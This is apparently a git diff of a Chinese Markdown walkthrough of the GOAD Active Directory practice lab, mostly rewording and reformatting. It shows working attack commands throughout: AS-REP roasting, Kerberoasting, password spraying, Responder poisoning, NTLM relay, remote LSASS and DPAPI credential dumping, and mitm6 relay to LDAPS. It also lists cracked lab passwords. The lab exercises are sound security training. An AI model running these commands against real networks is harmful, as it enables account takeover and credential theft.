@@ -17,11 +17,11 @@ tocOpen: true
 
 ### 成功案例
 
-建议仔细阅读[官方文档](https://github.com/Orange-Cyberdefense/GOAD)和u21h2大佬[文章](https://qusec.cn/posts/G0AD/)
+建议先阅读 [GOAD 官方文档](https://github.com/Orange-Cyberdefense/GOAD)和 [u21h2 的安装文章](https://qusec.cn/posts/G0AD/)。
 
 #### 安装历程
 
-本文仅供参考,推荐Ubuntu系统安装,服务器配置如下
+以下记录供参考，推荐使用 Ubuntu 安装。服务器配置如下：
 
 ```bash
             .-/+oossssoo+/-.               ctf@gh-virtual-machine
@@ -46,7 +46,7 @@ ossyNMMMNyMMhsssssssssssssshmmmhssssssso   CPU: Intel Xeon Silver 4210 (20) @ 2.
             .-/+oossssoo+/-.
 ```
 
-用国外大佬的[安装脚本](https://github.com/lkarlslund/deploy-goad.git),十分方便
+可以使用 [deploy-goad 安装脚本](https://github.com/lkarlslund/deploy-goad.git)部署：
 
 ```bash
 sudo -i
@@ -58,7 +58,7 @@ cd /opt/goad/ansible
 ansible-playbook main.yml
 ```
 
-如果出现失败,可以多运行几次ansible-playbook main.yml或者按顺序逐个执行文件,直到无报错
+如果安装失败，可以重试 `ansible-playbook main.yml`，或按顺序逐个执行文件，直至没有报错。
 
 ```bash
  ansible-playbook build.yml        # Install stuff and prepare vm
@@ -76,17 +76,17 @@ ansible-playbook main.yml
 
 #### 测试与备份
 
-推荐参照[KALI安装篇](https://github.com/N1etzsche0/GOAD/blob/main/GOAD-Part1-Install/KALI-Install.md)搭建攻击机进行攻击,简单方便
+攻击机可以参考 [Kali 安装记录](https://github.com/N1etzsche0/GOAD/blob/main/GOAD-Part1-Install/KALI-Install.md)搭建。
 
-在使用socks代理,进行nmap扫描时会有数据包丢失情况
+通过 SOCKS 代理使用 Nmap 扫描时，可能出现数据包丢失。
 
-服务器端启动chisel服务端
+在服务器上启动 Chisel 服务端：
 
 ```bash
 ubuntu@ctf:~$./chisel server -v -p port --socks5
 ```
 
-攻击机进行连接
+从攻击机连接：
 
 ```bash
 arch@ctf:~$./chisel client host:port socks
@@ -99,7 +99,7 @@ arch@ctf:~$cat /etc/proxychains.conf
 socks5  127.0.0.1 1080
 ```
 
-使用proxychains代理crackmapexec测试
+使用 ProxyChains 代理 CrackMapExec 进行测试：
 
 ```bash
 sudo proxychains -q poetry run crackmapexec smb  192.168.56.1/24
@@ -118,16 +118,16 @@ ubuntu@ctf:~$vagrant snapshot save initial-setup
 
 #### 失败经验
 
-在服务器上按照[官方文档](https://github.com/Orange-Cyberdefense/GOAD)中的,用docker创建并运行ansible,总是会停止在某个阶段,原因未知
+在服务器上按照[官方文档](https://github.com/Orange-Cyberdefense/GOAD)使用 Docker 运行 Ansible 时，安装总是在某个阶段停止，原因未知。
 
 ```bash
 sudo docker build -t goadansible .
 sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible ansible-playbook -i ../ad/sevenkingdoms.local/inventory main.yml
 ```
 
-我在Ubuntu上搭建openvpn访问GOAD靶场失败
+我尝试在 Ubuntu 上搭建 OpenVPN 访问 GOAD 靶场，但没有成功。
 
-有此想法的,可以参考GOAD作者在**proxmox**搭建GOAD的[文章](https://mayfly277.github.io/posts/GOAD-on-proxmox-part1-install/)
+如需在 Proxmox 上部署，可以参考 [GOAD 作者的文章](https://mayfly277.github.io/posts/GOAD-on-proxmox-part1-install/)。
 
 ### 失败案例
 
@@ -158,7 +158,7 @@ sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/
 
 所以修改Vagrantfile文件46、47配置为
 
-```txt
+```text
 v.memory = 2000
 v.cpus = 1
 ```
@@ -172,7 +172,7 @@ docker build -t goadansible .
 sudo  ansible-playbook main.yml
 ```
 
-在运行ansible,一堆报错,多次尝试还是失败,推测可能是系统原因或者配置不够???
+运行 Ansible 时出现多处报错，多次尝试仍然失败；可能与系统环境或资源配置有关。
 
 正在尝试用学校服务器重新搭建
 
@@ -182,7 +182,7 @@ sudo  ansible-playbook main.yml
 
 #### 安装指令
 
-本文参考[KALI官方教程](https://www.kali.org/docs/virtualization/install-vagrant-guest-vm/)
+这里参考 [Kali 官方教程](https://www.kali.org/docs/virtualization/install-vagrant-guest-vm/)。
 
 ```bash
 vagrant init kalilinux/rolling
@@ -190,7 +190,7 @@ vagrant init kalilinux/rolling
 
 Vagrantfile配置如下
 
-```config
+```ruby
 Vagrant.configure("2") do |config|
 
   config.vm.box = "kalilinux/rolling"
@@ -213,7 +213,7 @@ end
 vagrant up
 ```
 
-可以使用本地3333端口进行登陆或者vagrant ssh
+可以通过本地 `3333` 端口登录，或使用 `vagrant ssh`。
 
 #### 测试
 
@@ -265,14 +265,14 @@ SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Stan
 
 我们现在知道有 3 个域：
 
-* north.sevenkingdoms.local (2 ip)
-  * 192.168.56.22 CASTELBLACK(Windows server 2019)(signing false)
-  * 192.168.56.11 WINTERFELL(Windows server 2019)
-* sevenkingdoms.local (1 ip)
-  * 192.168.56.10 KINGSLANDING(Windows server 2019)
-* essos.local (2 ip)
-  * 192.168.56.23 BRAAVOS(Windows server 2016)(signing false)
-  * 192.168.56.12 MEEREEN(Windows Server 2016)
+- north.sevenkingdoms.local (2 ip)
+  - 192.168.56.22 CASTELBLACK(Windows server 2019)(signing false)
+  - 192.168.56.11 WINTERFELL(Windows server 2019)
+- sevenkingdoms.local (1 ip)
+  - 192.168.56.10 KINGSLANDING(Windows server 2019)
+- essos.local (2 ip)
+  - 192.168.56.23 BRAAVOS(Windows server 2016)(signing false)
+  - 192.168.56.12 MEEREEN(Windows Server 2016)
 
 本次实验中三个域各有一个域控制器。SMB 签名状态可以作为排查线索，但不能单凭它确定主机角色；下面再通过 DNS SRV 记录验证。要求 SMB 签名可以抵御针对 SMB 服务的 NTLM 中继，其他协议还需要各自的防护。
 
@@ -280,9 +280,9 @@ SMB是一种网络文件共享协议
 因此，SMB需要计算机或服务器上的网络端口才能与其他系统通信
 SMB使用IP端口:139或445
 
-* 端口 139：SMB最初使用端口139在NetBIOS之上运行NetBIOS是一个较旧的传输层，它允许Windows计算机在同一网络上相互通信
+- 端口 139：SMB最初使用端口139在NetBIOS之上运行NetBIOS是一个较旧的传输层，它允许Windows计算机在同一网络上相互通信
 
-* 端口 445：更高版本的SMB(在Windows2000之后)开始在TCP堆栈之上使用端口445,使用TCP允许SMB通过Internet工作
+- 端口 445：更高版本的SMB(在Windows2000之后)开始在TCP堆栈之上使用端口445,使用TCP允许SMB通过Internet工作
 
 #### 寻找域控
 
@@ -495,11 +495,11 @@ nmap会在扫描目标之前执行ping,如果目标不响应ping,它将被忽略
 nmap -Pn -p- -sC -sV -oA full_scan_goad 192.168.56.10-12,22-23
 ```
 
-* Pn 不ping 直接扫描提供的全部IP
-* p- 扫描全部65535个端口
-* sC 执行侦查脚本
-* sV 遍历版本
-* oA 以三种形式输出结果 (nmap classic, grep format, xml format)
+- Pn 不ping 直接扫描提供的全部IP
+- p- 扫描全部65535个端口
+- sC 执行侦查脚本
+- sV 遍历版本
+- oA 以三种形式输出结果 (nmap classic, grep format, xml format)
 
 ```bash
 # Nmap 7.93 scan initiated Fri Jun  2 05:50:26 2023 as: nmap -Pn -p- -sC -sV -oA full_scan_goad 192.168.56.10-12,22-23
@@ -1260,12 +1260,12 @@ enum4linux complete on Sat Jun  3 09:57:42 2023
 相对标识符(Relative Identifier，RID)是Windows用于跟踪和识别对象的唯一标识符(十六进制表示)
 为了说明它的作用，让我们看下面的示例：
 
-* NAME_DOMAIN.LOCAL域的SID是：S-1-5-21-1038751438-1834703946-36937684957
+- NAME_DOMAIN.LOCAL域的SID是：S-1-5-21-1038751438-1834703946-36937684957
 
-* 在域内创建对象时，上述数字(SID)将与RID组合，以生成一个用于表示对象的唯一值
+- 在域内创建对象时，上述数字(SID)将与RID组合，以生成一个用于表示对象的唯一值
 因此，带有RID：[0x457] Hex 0x457等于十进制数1111的域用户john，其完整的用户SID为：S-1-5-21-1038751438-1834703946-36937684957-1111
 
-* 这是该域中john对象的唯一标识符，您永远不会在该域或任何其他域中看到此配对值与其他对象相关联
+- 这是该域中john对象的唯一标识符，您永远不会在该域或任何其他域中看到此配对值与其他对象相关联
 
 定义来自[此处](https://academy.hackthebox.com/module/143/section/1269)
 
@@ -1743,11 +1743,11 @@ PORT   STATE SERVICE
 
 Script krb5-enum-users摘要:
 
->通过强制查询可能的用户名对Kerberos服务进行验证来发现有效的用户名
+> 通过强制查询可能的用户名对Kerberos服务进行验证来发现有效的用户名
 
->当请求无效的用户名时，服务器将使用Kerberos错误代码KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN响应，从而使我们确定用户名无效
+> 当请求无效的用户名时，服务器将使用Kerberos错误代码KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN响应，从而使我们确定用户名无效
 
->有效的用户名将引起AS-REP响应中的TGT或错误KRB5KDC_ERR_PREAUTH_REQUIRED，表示需要用户执行预身份验证
+> 有效的用户名将引起AS-REP响应中的TGT或错误KRB5KDC_ERR_PREAUTH_REQUIRED，表示需要用户执行预身份验证
 
 当爆破用户时，badpwdcount值不会增加
 
@@ -1818,16 +1818,16 @@ SMB         192.168.56.22   445    CASTELBLACK      public                      
 
 知道用户名,获取密码,两种方式:
 
-* AS-REP Roast
+- AS-REP Roast
 
-* Password spray密码喷洒
+- Password spray密码喷洒
 
 #### AS-REP Roast
 
 [AS-REP Roasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
->AS-REP烤饼(AS-REP roasting)是一种技术，可以获取选择了**不需要Kerberos预身份验证标志**的用户的密码哈希值
+> AS-REP烤饼(AS-REP roasting)是一种技术，可以获取选择了**不需要Kerberos预身份验证标志**的用户的密码哈希值
 
->禁用预授权是一种危险的错误配置，攻击者可以简单地查询 KDC 以查找禁用预身份验证的用户，然后为每个用户请求 TGT，然后 TGT 可以从内存中转储并在暴力密码破解攻击中脱机使用，如果密码被破解，则攻击者将拥有域用户的有密码铭文
+> 禁用预授权是一种危险的错误配置，攻击者可以简单地查询 KDC 以查找禁用预身份验证的用户，然后为每个用户请求 TGT，然后 TGT 可以从内存中转储并在暴力密码破解攻击中脱机使用，如果密码被破解，则攻击者将拥有域用户的有密码铭文
 
 根据之前结果制作[字典](https://github.com/N1etzsche0/GOAD/blob/main/GOAD-Part3-Find-User/workspace/north.sevenkingdoms.local-users.txt)
 
@@ -1857,7 +1857,7 @@ $krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:30a743660db54d8c4207ddead8
 ```
 
 GetNPUsers摘要:
->这个脚本会尝试获得并列出不需要Kerberos域认证(UF_DONT_REQUIRE_PREAUTH)的用户，输出和JtR兼容,
+> 这个脚本会尝试获得并列出不需要Kerberos域认证(UF_DONT_REQUIRE_PREAUTH)的用户，输出和JtR兼容,
 
 hashcat破解[brandon.stark.hash](https://github.com/N1etzsche0/GOAD/blob/main/GOAD-Part3-Find-User/workspace/brandon.stark.hash)
 
@@ -1867,8 +1867,8 @@ hashcat -a 0 -m 18200 brandon.stark.hash /usr/share/wordlists/rockyou.txt
 
 现在已经知道的域的用户和密码:
 
-* samwell.tarly:Heartsbane(用户描述)
-* brandon.stark:iseedeadpeople(AS-REP Roasting)
+- samwell.tarly:Heartsbane(用户描述)
+- brandon.stark:iseedeadpeople(AS-REP Roasting)
 
 #### CVE-2022-33679
 
@@ -1891,7 +1891,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 #### Password Spray密码喷洒
 
->密码喷洒属于密码猜测的一种，通常以少量候选密码尝试多个用户；它不能保证避免账户锁定，仍需结合密码策略和已有失败次数判断。
+> 密码喷洒属于密码猜测的一种，通常以少量候选密码尝试多个用户；它不能保证避免账户锁定，仍需结合密码策略和已有失败次数判断。
 
 使用CME
 
@@ -1974,17 +1974,17 @@ SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\Ad
 
 现在获得了三对凭据：
 
-* north.sevenkingdoms.local\samwell.tarly:Heartsbane(用户描述)
-* north.sevenkingdoms.local\brandon.stark:iseedeadpeople(AS-REP Roasting)
-* north.sevenkingdoms.local\hodor:hodor(密码喷洒)
-* ~~vagrant:vagrant(密码喷洒)~~
+- north.sevenkingdoms.local\samwell.tarly:Heartsbane(用户描述)
+- north.sevenkingdoms.local\brandon.stark:iseedeadpeople(AS-REP Roasting)
+- north.sevenkingdoms.local\hodor:hodor(密码喷洒)
+- ~~vagrant:vagrant(密码喷洒)~~
 
 ## 五、用户与域环境枚举
 
 ### 列出用户
 
-* 当您在活动目录上获得一个帐户时，要做的第一件事总是**获得完整的用户列表**
-* 一旦你得到它，你就可以在完整的用户列表上进行密码喷洒(你经常会发现其他帐户的密码很弱，比如 username=password、SeasonYear!、SocietynameYear! 甚至 123456)
+- 当您在活动目录上获得一个帐户时，要做的第一件事总是**获得完整的用户列表**
+- 一旦你得到它，你就可以在完整的用户列表上进行密码喷洒(你经常会发现其他帐户的密码很弱，比如 username=password、SeasonYear!、SocietynameYear! 甚至 123456)
 
 ```bash
 impacket-GetADUsers -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople
@@ -2110,18 +2110,18 @@ distinguishedName: CN=maester.pycelle,OU=Crownlands,DC=sevenkingdoms,DC=local
 #### Kerberos协议
 
 [Kerberos协议概述](https://y4er.com/posts/kerberos-as_req-and-as_rep/):
->Kerberos是一种由MIT(麻省理工大学)提出的一种网络身份验证协议
+> Kerberos是一种由MIT(麻省理工大学)提出的一种网络身份验证协议
 
->它旨在通过使用密钥加密技术为客户端/服务器应用程序提供强身份验证
+> 它旨在通过使用密钥加密技术为客户端/服务器应用程序提供强身份验证
 
->在Kerberos协议中主要是有三个角色的存在:
+> 在Kerberos协议中主要是有三个角色的存在:
 
 >
->1. 访问服务的Client(以下表述为Client 或者用户)
->2. 提供服务的Server(以下表述为服务)
->3. KDC(Key Distribution Center)密钥分发中心 kerberos 测试工具介绍
+> 1. 访问服务的Client(以下表述为Client 或者用户)
+> 2. 提供服务的Server(以下表述为服务)
+> 3. KDC(Key Distribution Center)密钥分发中心 kerberos 测试工具介绍
 
->其中KDC服务默认会安装在一个域的域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定
+> 其中KDC服务默认会安装在一个域的域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定
 
 kerberos的简化认证认证过程如下图
 
@@ -2157,21 +2157,21 @@ serviceclass/host:port/servicename
 3. 如果服务运行在默认端口上，则端口号(port)可以省略
 
 **kerberoasting:**
->通过SPN发现服务(比如MSSQL)
+> 通过SPN发现服务(比如MSSQL)
 >
->具有域内普通用户权限
+> 具有域内普通用户权限
 >
->向SPN服务进行交互,请求Kerberos票据(当用户的TGT被验证为有效时，TGS会向用户发送一张票据，该票据使用与SPN关联服务的计算机服务账号相同的NTLM Hash，比如MSSQL账户的Hash)
+> 向SPN服务进行交互,请求Kerberos票据(当用户的TGT被验证为有效时，TGS会向用户发送一张票据，该票据使用与SPN关联服务的计算机服务账号相同的NTLM Hash，比如MSSQL账户的Hash)
 >
->根据字典爆破生成Hash,去尝试打开该Kerberos票据
+> 根据字典爆破生成Hash,去尝试打开该Kerberos票据
 >
->如果成功,则获得了MSSQL服务账户的密码
+> 如果成功,则获得了MSSQL服务账户的密码
 >
->攻击者可以伪造TGS白银票据,在TGS中标识访问账号为域管理员账号 从而获取服务的域管理员访问权限
+> 攻击者可以伪造TGS白银票据,在TGS中标识访问账号为域管理员账号 从而获取服务的域管理员访问权限
 >
->或者用于委派攻击(服务账号大多都会被设置委派，如果是非约束委派，则获取服务账号的口令后，可直接获取域管理员权限)
+> 或者用于委派攻击(服务账号大多都会被设置委派，如果是非约束委派，则获取服务账号的口令后，可直接获取域管理员权限)
 
-* 在活动目录中，我们经常会看到设置了 SPN 的用户
+- 在活动目录中，我们经常会看到设置了 SPN 的用户
 
 使用impacket
 
@@ -2223,7 +2223,7 @@ $krb5tgs$23$*jon.snow$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local/jon.sn
 
 获取另一个用户账户密码
 
-* north.sevenkingdoms.local\jon.snow:iknownothing
+- north.sevenkingdoms.local\jon.snow:iknownothing
 
 ### 共享枚举
 
@@ -2468,7 +2468,7 @@ SMB         192.168.56.10   445    KINGSLANDING     SYSVOL          READ        
 ### DNS 转储
 
 [Active Directory 集成 DNS 转储工具](https://github.com/dirkjanm/adidnsdump)
->默认情况下，Active Directory 中的任何用户都可以枚举域或林 DNS 区域中的所有 DNS 记录，类似于区域传输,此工具启用区域中所有 DNS 记录的枚举和导出，用于内部网络的侦察目的
+> 默认情况下，Active Directory 中的任何用户都可以枚举域或林 DNS 区域中的所有 DNS 记录，类似于区域传输,此工具启用区域中所有 DNS 记录的枚举和导出，用于内部网络的侦察目的
 
 ```bash
 adidnsdump -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' winterfell.north.sevenkingdoms.local
@@ -2497,8 +2497,8 @@ A,@,192.168.56.11
 
 ### Bloodhound
 
-* Boodhound 是活动目录渗透测试的最佳工具之一,此工具将帮助您找到破解 AD 的所有路径，是您武器库中的必备工具！
-* 要启动 bloodhound，您首先需要从不同的域中检索所有数据
+- Boodhound 是活动目录渗透测试的最佳工具之一,此工具将帮助您找到破解 AD 的所有路径，是您武器库中的必备工具！
+- 要启动 bloodhound，您首先需要从不同的域中检索所有数据
 
 Linux环境,直接用python脚本:
 
@@ -2592,7 +2592,7 @@ INFO: Compressing output into 20230611012109_bloodhound.zip
 
 不添加-ns参数,dns解析不到我们在/etc/hosts设定的ip地址
 
-* -ns 名称服务器,--nameserver 名称服务,用于查询的备用名称服务器
+- -ns 名称服务器,--nameserver 名称服务,用于查询的备用名称服务器
 
 使用Kerberos协议,报错:
 
@@ -2618,7 +2618,7 @@ impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KRB_AP_ERR_BAD_IN
 
 所以添加参数--auth-method ntml
 
-* --auth-method {auto,ntlm,kerberos} 身份验证方法。强制使用Kerberos或NTLM，或者使用自动模式，在Kerberos失败时使用NTLM
+- --auth-method {auto,ntlm,kerberos} 身份验证方法。强制使用Kerberos或NTLM，或者使用自动模式，在Kerberos失败时使用NTLM
 
 #### BloodHound使用
 
@@ -2629,6 +2629,7 @@ MATCH p = (d:Domain)-[r:Contains*1..]->(n:Computer) RETURN p
 ```
 
 ![BloodHound1](part4-bloodhound1.png)
+
 显示所有用户
 
 ```sql
@@ -2636,6 +2637,7 @@ MATCH p = (d:Domain)-[r:Contains*1..]->(n:User) RETURN p
 ```
 
 ![BloodHound2](part4-bloodhound2.png)
+
 domain/group/user之间的映射
 
 ```sql
@@ -2643,6 +2645,7 @@ MATCH q=(d:Domain)-[r:Contains*1..]->(n:Group)<-[s:MemberOf]-(u:User) RETURN q
 ```
 
 ![BloodHound3](part4-bloodhound3.png)
+
 用户ACL
 
 ```sql
@@ -2650,6 +2653,7 @@ MATCH p=(u:User)-[r1]->(n) WHERE r1.isacl=true and not tolower(u.name) contains 
 ```
 
 ![BloodHound4](part4-bloodhound4.png)
+
 更多参考:
 
 [BloodHound Cypher Cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
@@ -2674,8 +2678,8 @@ xfreerdp /u:hodor /p:hodor /d:north /v:192.168.56.22 /cert-ignore
 xfreerdp /u:jon.snow /p:iknownothing /d:north /v:192.168.56.22 /cert-ignore
 ```
 
-* C:\vagrant 文件夹会自动安装在虚拟机上，这将简化文件传输
-* 我们将启动 Sharphound 来检索域名信息
+- C:\vagrant 文件夹会自动安装在虚拟机上，这将简化文件传输
+- 我们将启动 Sharphound 来检索域名信息
 
 ```powershell
 .\SharpHound.exe -d north.sevenkingdoms.local -c all --zipfilename bh_north_sevenkingdoms.zip
@@ -2798,10 +2802,10 @@ bloodhound-python --zip -c All -d north.sevenkingdoms.local -u brandon.stark -p 
 
 可以使用[Responder](https://github.com/lgandx/Responder)获得如下信息:
 
-* 用户名
-* netntlmv1哈希(如果服务器很旧)/netntlmv2哈希
-* 重定向身份验证的能力(NTLM 中继)
-* .....
+- 用户名
+- netntlmv1哈希(如果服务器很旧)/netntlmv2哈希
+- 重定向身份验证的能力(NTLM 中继)
+- .....
 
 在实验室中，有两个bots来模拟 LLMRN、MDNS 和 NBT-NS 请求，一名用户的密码较弱，但没有管理员权限，另一个用户拥有管理员权限，但使用强密码
 
@@ -2972,19 +2976,19 @@ Eddard的密码比较强，用这个方法是破解不了的
 
 目前获取的凭据：
 
-* north.sevenkingdoms.local\samwell.tarly:Heartsbane（用户描述）
+- north.sevenkingdoms.local\samwell.tarly:Heartsbane（用户描述）
 
-* north.sevenkingdoms.local\brandon.stark:iseedeadpeople（AS-REP Roasting）
+- north.sevenkingdoms.local\brandon.stark:iseedeadpeople（AS-REP Roasting）
 
-* north.sevenkingdoms.local\hodor:hodor（密码喷洒）
+- north.sevenkingdoms.local\hodor:hodor（密码喷洒）
 
-* north.sevenkingdoms.local\jon.snow:iknownothing（Kerberoasting）
+- north.sevenkingdoms.local\jon.snow:iknownothing（Kerberoasting）
 
-* north.sevenkingdoms.local\robb.stark:sexywolfy （Responder）
+- north.sevenkingdoms.local\robb.stark:sexywolfy （Responder）
 
 攻克机器：
 
-* north.sevenkingdoms.local
+- north.sevenkingdoms.local
 
 ### NTLM Relay
 
@@ -3024,13 +3028,13 @@ sudo impacket-ntlmrelayx -tf relay.txt -of netntlm -smb2support -socks
 
 启动
 
-* -tf：要中继身份验证的目标列表
+- -tf：要中继身份验证的目标列表
 
-* -of：输出文件，这将保留捕获的SMB哈希，就像我们之前使用响应器所做的那样，以便以后破解它们
+- -of：输出文件，这将保留捕获的SMB哈希，就像我们之前使用响应器所做的那样，以便以后破解它们
 
-* -smb2support：支持 SMB2
+- -smb2support：支持 SMB2
 
-* -socks：将启动袜子代理以使用中继身份验证
+- `-socks`：启动 SOCKS 代理，使用中继得到的认证连接
 
 ```bash
 ntlmrelayx> socks
@@ -3042,9 +3046,9 @@ SMB       192.168.56.23  NORTH/EDDARD.STARK  FALSE        445
 SMB       192.168.56.23  NORTH/ROBB.STARK    FALSE        445
 ```
 
-* 投毒中继到了castelblack (192.168.56.22) 和 essos (192.168.56.23)，并设置了一个 socks 代理来使用该连接
+- 投毒中继到了castelblack (192.168.56.22) 和 essos (192.168.56.23)，并设置了一个 socks 代理来使用该连接
 
-* 由于 eddard.stark 是 north.sevenkingdoms.local 的域管理员，他在 castelback (192.168.56.22) 上获得了管理员权限
+- 由于 eddard.stark 是 north.sevenkingdoms.local 的域管理员，他在 castelback (192.168.56.22) 上获得了管理员权限
 
 ![BloodHound2](part5-bloodhound2.png)
 
@@ -3104,19 +3108,19 @@ north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee
 [*] Stopping service RemoteRegistry
 ```
 
-* sam 数据库包含本地帐户（忽略 vagrant，因为它是设置实验室的默认用户）
-* 获得了本地管理员用户的 NTLM Hash
-* 获得了最后连接用户的 LSA 缓存（默认情况下 Windows 保留最后 10 个用户），即使域控制器无法访问，这对于连接到服务器也很有用，但这些缓存的凭证可以用 hashcat 离线破解（非常慢）
-* 最后，我们还获得了机器帐户的哈希值（如果获取了机器帐户NTML Hash，就相当于拥有一个域用户的权限）
+- sam 数据库包含本地帐户（忽略 vagrant，因为它是设置实验室的默认用户）
+- 获得了本地管理员用户的 NTLM Hash
+- 获得了最后连接用户的 LSA 缓存（默认情况下 Windows 保留最后 10 个用户），即使域控制器无法访问，这对于连接到服务器也很有用，但这些缓存的凭证可以用 hashcat 离线破解（非常慢）
+- 最后，我们还获得了机器帐户的哈希值（如果获取了机器帐户NTML Hash，就相当于拥有一个域用户的权限）
 
->使用机器帐户，您可以像任何其他域用户一样查询 LDAP，运行 Bloodhound Ingestor
+> 使用机器帐户，您可以像任何其他域用户一样查询 LDAP，运行 Bloodhound Ingestor
 
 #### Lsassy
 
-* 使用 lsassy 获取 lsass 进程存储的凭据
+- 使用 lsassy 获取 lsass 进程存储的凭据
 
-* 域帐户信息存储在 LSASS 进程中，因此转储此进程可以为您提供更多的域帐户和权限
-* Lsassy 允许您远程转储 lsass（比执行 procdump、下载 lsass 转储文件并在本地执行 pypykatz 或 mimikatz 更方便），它会为您执行所有痛苦的操作，如转储和读取 lsass 内容（它也只转储 lsass 转储的有用部分优化传输时间）（lsassy 也作为一个 cme 模块存在）
+- 域帐户信息存储在 LSASS 进程中，因此转储此进程可以为您提供更多的域帐户和权限
+- Lsassy 允许您远程转储 lsass（比执行 procdump、下载 lsass 转储文件并在本地执行 pypykatz 或 mimikatz 更方便），它会为您执行所有痛苦的操作，如转储和读取 lsass 内容（它也只转储 lsass 转储的有用部分优化传输时间）（lsassy 也作为一个 cme 模块存在）
 
 ```bash
 proxychains lsassy --no-pass -d NORTH -u EDDARD.STARK 192.168.56.22
@@ -3148,10 +3152,10 @@ proxychains lsassy --no-pass -d NORTH -u EDDARD.STARK 192.168.56.22
 
 #### DonPapi
 
-* 它用于获取 dpapi 和其他密码存储的信息（文件、浏览器、计划任务等）
-* 该工具不接触 LSASS，因此它更加隐蔽，并且即使在目标上启用了 av 和 edr，也能在大多数时间工作
+- 它用于获取 dpapi 和其他密码存储的信息（文件、浏览器、计划任务等）
+- 该工具不接触 LSASS，因此它更加隐蔽，并且即使在目标上启用了 av 和 edr，也能在大多数时间工作
 
-```
+```bash
 proxychains DonPAPI -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
 ```
 
@@ -3382,28 +3386,29 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 C:\Windows\system32>
 ```
 
->对于socks连接，只能使用smbexec 或atexec，wmiexec、psexec 和 dcomexec 都不起作用（此处说明： <https://github.com/SecureAuthCorp/impacket/issues/412）>
+> 对于 SOCKS 连接，只能使用 `smbexec` 或 `atexec`；`wmiexec`、`psexec` 和 `dcomexec` 不适用。详见 [Impacket issue #412](https://github.com/SecureAuthCorp/impacket/issues/412)。
 
 ### Mitm6 + ntlmrelayx to ldap
 
->由于MS16-077导致LLMNR/NBNS投毒指定WPAD文件方法失效，所以另一种有用方法是响应 DHCPv6 请求并将我们的主机设置为默认 DNS 服务器进行WPAD欺骗
+> 由于MS16-077导致LLMNR/NBNS投毒指定WPAD文件方法失效，所以另一种有用方法是响应 DHCPv6 请求并将我们的主机设置为默认 DNS 服务器进行WPAD欺骗
 >
->Windows 优先使用 IPv6 而不是 IPv4，因此我们可以捕获并毒害对 DHCPv6 查询的响应，使用**MITM6**更改 DNS 服务器并将查询重定向到我们的计算机
+> Windows 优先使用 IPv6 而不是 IPv4，因此我们可以捕获并毒害对 DHCPv6 查询的响应，使用**MITM6**更改 DNS 服务器并将查询重定向到我们的计算机
 >
->在实际的IPv6网络中，客户端的IPv6是由主机本身分配的，不需要DHCP服务器
+> 在实际的IPv6网络中，客户端的IPv6是由主机本身分配的，不需要DHCP服务器
 >
 > NTLM 认证消息嵌入在 SMB、HTTP、MSSQL、SMTP 和 IMAP 等应用协议的数据包中，LM 和 NTLM 认证协议是"独立于应用协议的"
 >
 > 这意味着可以将某个协议（例如 HTTP）中继 LM 或 NTLM 认证消息 到 另一个协议（例如 SMB），这称为跨协议 LM/NTLM 中继，但也预示着跨协议中继攻击受到应用程序协议的制约
 > 下表总结了跨协议中继攻击的预期行为，具体取决于已经实施的缓解措施，表中列出的所有测试和结果均使用 Impacket 的 ntlmrelayx（Python）完成
+
 ![GOAD 实验截图](part5-ntlm-relau-mitigation-chart.webp)
 
-* 启动mitm6来毒化 DHCPv6 并从主机获取 DNS 请求
-* 顺便说一句，我注意到我们可以毒化域控制器，但 DC 并不受影响，仍然使用他们的本地 DNS 服务器
-* 所以只能毒化 MSSQL 服务器
-* 接下来将毒化 braavos 服务器将 wpad 查询并将 http 查询中继到 meereen 上的 ldaps，以添加具有委派权限的计算机
+- 启动mitm6来毒化 DHCPv6 并从主机获取 DNS 请求
+- 顺便说一句，我注意到我们可以毒化域控制器，但 DC 并不受影响，仍然使用他们的本地 DNS 服务器
+- 所以只能毒化 MSSQL 服务器
+- 接下来将毒化 braavos 服务器将 wpad 查询并将 http 查询中继到 meereen 上的 ldaps，以添加具有委派权限的计算机
 
-* 使用mitm6开始中毒并启动ntlmrelayx
+- 使用mitm6开始中毒并启动ntlmrelayx
 
 ```bash
 sudo /root/.local/bin/mitm6 -i eth1 -d essos.local -d sevenkingdoms.local -d north.sevenkingdoms.local --debug
@@ -3413,13 +3418,14 @@ sudo /root/.local/bin/mitm6 -i eth1 -d essos.local -d sevenkingdoms.local -d nor
 sudo impacket-ntlmrelayx -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local --add-computer fake01 --delegate-access
 ```
 
-* -6 : 在 IPv4 和 IPv6 网络上监听并执行操作
-* -wh : ntlmrelayx 返回托管 WPAD 文件的服务器，由于不需要 WPAD 文件中的任何内容（mitm6 回答了所有问题），必须选择网络中不存在的主机
-* -t : 将凭据中继到指定的服务器，如果没有"-t"，凭据将转发回客户端
-* --add-computer : 尝试添加新的计算机帐户
-* --delegate-access : 将中继计算机帐户的访问权限委派给指定帐户(启动委派攻击)
+- -6 : 在 IPv4 和 IPv6 网络上监听并执行操作
+- -wh : ntlmrelayx 返回托管 WPAD 文件的服务器，由于不需要 WPAD 文件中的任何内容（mitm6 回答了所有问题），必须选择网络中不存在的主机
+- -t : 将凭据中继到指定的服务器，如果没有"-t"，凭据将转发回客户端
